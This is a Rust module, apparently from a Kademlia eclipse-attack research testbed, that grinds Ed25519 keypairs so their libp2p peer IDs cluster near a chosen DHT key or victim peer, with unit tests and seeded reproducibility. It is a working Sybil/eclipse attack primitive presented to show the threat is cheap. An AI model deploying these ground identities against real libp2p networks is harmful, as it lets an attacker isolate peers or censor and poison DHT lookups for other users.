//! The attack side: grinding Ed25519 keypairs whose `PeerId` lands XOR-closest
//! to a chosen target key.
//!
//! This is the part that demonstrates the threat model. A libp2p peer ID is
//! `multihash(pubkey)` with no additional constraint, so producing IDs that
//! cluster around a target costs only keypair generation. Everything the
//! attacker sends afterwards is validly signed — which is precisely why record
//! authentication (py-libp2p #1348 / #1339) does not touch this attack.

use std::{collections::BinaryHeap, time::Instant};

// Via the `libp2p` facade, NOT a direct `libp2p-identity` dependency.
// See the note in Cargo.toml.
use libp2p::{identity::Keypair, kad::KBucketKey, PeerId};

/// SplitMix64, used only to expand a `u64` seed into deterministic Ed25519
/// secrets for reproducible grinding. Deliberately hand-written rather than a
/// `rand` dependency (see `Cargo.toml`): it is not cryptographic and does not
/// need to be — it only has to be reproducible and spread candidates across the
/// key space. Reference: Steele & Vigna, "Fast Splittable PRNGs".
struct SplitMix64 {
    state: u64,
}

impl SplitMix64 {
    fn new(seed: u64) -> Self {
        Self { state: seed }
    }

    fn next_u64(&mut self) -> u64 {
        self.state = self.state.wrapping_add(0x9E37_79B9_7F4A_7C15);
        let mut z = self.state;
        z = (z ^ (z >> 30)).wrapping_mul(0xBF58_476D_1CE4_E5B9);
        z = (z ^ (z >> 27)).wrapping_mul(0x94D0_49BB_1331_11EB);
        z ^ (z >> 31)
    }

    /// 32 deterministic bytes — one Ed25519 secret.
    fn next_secret(&mut self) -> [u8; 32] {
        let mut out = [0u8; 32];
        for chunk in out.chunks_mut(8) {
            chunk.copy_from_slice(&self.next_u64().to_le_bytes());
        }
        out
    }
}

/// A ground-out identity: the keypair, its peer ID, and how close it landed.
pub struct GroundIdentity {
    pub keypair: Keypair,
    pub peer_id: PeerId,
    pub distance: libp2p::kad::KBucketDistance,
}

impl GroundIdentity {
    /// Common-prefix length with the target: the number of leading bits this
    /// identity shares with the target key. Higher means a closer landing.
    /// `None` only on an exact key collision (distance zero), which does not
    /// occur in practice.
    pub fn cpl(&self) -> Option<u32> {
        self.distance.ilog2().map(|l| 255 - l)
    }
}

impl std::fmt::Debug for GroundIdentity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("GroundIdentity")
            .field("peer_id", &self.peer_id)
            .field("ilog2_distance", &self.distance.ilog2())
            .finish_non_exhaustive()
    }
}

/// Grinds peer IDs toward a target key in Kademlia XOR space.
pub struct TargetedIdGenerator {
    target: KBucketKey<Vec<u8>>,
    best_n: usize,
    /// When set, keypairs are derived deterministically from this seed rather
    /// than OS randomness, so a run reproduces exactly. See [`Self::seed`].
    seed: Option<u64>,
}

impl TargetedIdGenerator {
    /// Target an arbitrary DHT key (what a `GET_VALUE` eclipse aims at).
    pub fn for_key(key: impl Into<Vec<u8>>) -> Self {
        Self {
            target: KBucketKey::new(key.into()),
            best_n: 20,
            seed: None,
        }
    }

    /// Target the region around a specific peer (what a routing eclipse of a
    /// single victim aims at).
    pub fn for_peer(peer: PeerId) -> Self {
        Self {
            target: KBucketKey::new(peer.to_bytes()),
            best_n: 20,
            seed: None,
        }
    }

    /// How many identities to keep. Default 20 = the libp2p `k` value, i.e. one
    /// full bucket.
    pub fn best_n(mut self, n: usize) -> Self {
        self.best_n = n;
        self
    }

    /// Derive keypairs deterministically from `seed` instead of OS randomness.
    /// The same seed and trial count always yield the same identities — the
    /// reproducibility `docs/methodology.md` requires. Uses a hand-written
    /// SplitMix64 expanded into 32-byte Ed25519 secrets; no `rand` dependency,
    /// see the note in `Cargo.toml`.
    pub fn seed(mut self, seed: u64) -> Self {
        self.seed = Some(seed);
        self
    }

    /// Run `trials` keypair generations and return the `best_n` closest,
    /// sorted nearest-first.
    ///
    /// Uses a bounded max-heap so memory is O(best_n) rather than O(trials) —
    /// this matters at the 10M-trial end where the interesting numbers live.
    pub fn generate(&self, trials: usize) -> GrindResult {
        let started = Instant::now();
        // Reverse => BinaryHeap behaves as a max-heap on distance, so `peek` is
        // the worst kept candidate and is the one to evict.
        let mut heap: BinaryHeap<(libp2p::kad::KBucketDistance, usize)> = BinaryHeap::new();
        let mut kept: Vec<Option<(Keypair, PeerId)>> = Vec::with_capacity(self.best_n + 1);
        // `Some` only when a seed was set; drives deterministic key derivation.
        let mut prng = self.seed.map(SplitMix64::new);

        for _ in 0..trials {
            let kp = match prng {
                Some(ref mut p) => Keypair::ed25519_from_bytes(p.next_secret())
                    .expect("32 bytes is always a valid ed25519 secret"),
                None => Keypair::generate_ed25519(),
            };
            let peer_id = PeerId::from(kp.public());
            let distance = KBucketKey::from(peer_id).distance(&self.target);

            if heap.len() < self.best_n {
                kept.push(Some((kp, peer_id)));
                heap.push((distance, kept.len() - 1));
            } else if let Some(&(worst, worst_idx)) = heap.peek() {
                if distance < worst {
                    heap.pop();
                    kept[worst_idx] = Some((kp, peer_id));
                    heap.push((distance, worst_idx));
                }
            }
        }

        // `into_sorted_vec` yields ascending order, and the tuple sorts on
        // `distance` first — so this is already nearest-first.
        let out: Vec<GroundIdentity> = heap
            .into_sorted_vec()
            .into_iter()
            .filter_map(|(distance, idx)| {
                kept[idx].take().map(|(keypair, peer_id)| GroundIdentity {
                    keypair,
                    peer_id,
                    distance,
                })
            })
            .collect();

        GrindResult {
            identities: out,
            trials,
            elapsed: started.elapsed(),
            seed: self.seed,
        }
    }
}

pub struct GrindResult {
    pub identities: Vec<GroundIdentity>,
    pub trials: usize,
    pub elapsed: std::time::Duration,
    /// The seed the run used, or `None` if it drew from OS randomness.
    pub seed: Option<u64>,
}

impl GrindResult {
    /// Identities produced per second — the headline "the attack is cheap" number.
    pub fn rate(&self) -> f64 {
        self.trials as f64 / self.elapsed.as_secs_f64().max(f64::EPSILON)
    }

    /// The `ilog2` of the closest distance achieved. Higher common-prefix means
    /// deeper penetration toward the target; compare against the value an honest
    /// network of size N would naturally produce (~log2(N)).
    pub fn best_cpl(&self) -> Option<u32> {
        self.identities.first().and_then(|g| g.cpl())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn grinding_beats_random_placement() {
        let target = b"kad-eclipse-testbed/test-target".to_vec();
        let gen = TargetedIdGenerator::for_key(target.clone()).best_n(4);

        let ground = gen.generate(4_000);
        let random = gen.generate(4);

        let best_ground = ground.identities.first().map(|g| g.distance).unwrap();
        let best_random = random.identities.first().map(|g| g.distance).unwrap();

        // 1000x the trials should reliably land closer. Probabilistic, but the
        // margin is enormous; if this flakes the heap eviction is wrong.
        assert!(
            best_ground < best_random,
            "grinding did not improve on random placement"
        );
    }

    #[test]
    fn keeps_exactly_best_n_sorted_nearest_first() {
        let gen = TargetedIdGenerator::for_key(b"abc".to_vec()).best_n(8);
        let res = gen.generate(500);
        assert_eq!(res.identities.len(), 8);
        for w in res.identities.windows(2) {
            assert!(w[0].distance <= w[1].distance, "results not sorted");
        }
    }

    #[test]
    fn same_seed_gives_identical_identities() {
        let gen = TargetedIdGenerator::for_key(b"kad-eclipse-testbed/seed-test".to_vec())
            .best_n(8)
            .seed(0xDEAD_BEEF);
        let first = gen.generate(2_000);
        let second = gen.generate(2_000);

        let ids = |r: &GrindResult| r.identities.iter().map(|g| g.peer_id).collect::<Vec<_>>();
        assert_eq!(
            ids(&first),
            ids(&second),
            "same seed must reproduce exactly"
        );
        assert_eq!(first.seed, Some(0xDEAD_BEEF));
    }

    #[test]
    fn different_seeds_give_different_identities() {
        let target = b"kad-eclipse-testbed/seed-test".to_vec();
        let a = TargetedIdGenerator::for_key(target.clone())
            .best_n(8)
            .seed(1)
            .generate(2_000);
        let b = TargetedIdGenerator::for_key(target)
            .best_n(8)
            .seed(2)
            .generate(2_000);

        let ids = |r: &GrindResult| r.identities.iter().map(|g| g.peer_id).collect::<Vec<_>>();
        assert_ne!(ids(&a), ids(&b), "different seeds must diverge");
    }

    #[test]
    fn unseeded_generate_reports_no_seed() {
        let res = TargetedIdGenerator::for_key(b"abc".to_vec())
            .best_n(4)
            .generate(200);
        assert_eq!(res.seed, None);
        assert_eq!(res.identities.len(), 4);
        // cpl() agrees with the headline best_cpl().
        assert_eq!(res.identities.first().and_then(|g| g.cpl()), res.best_cpl());
    }
}
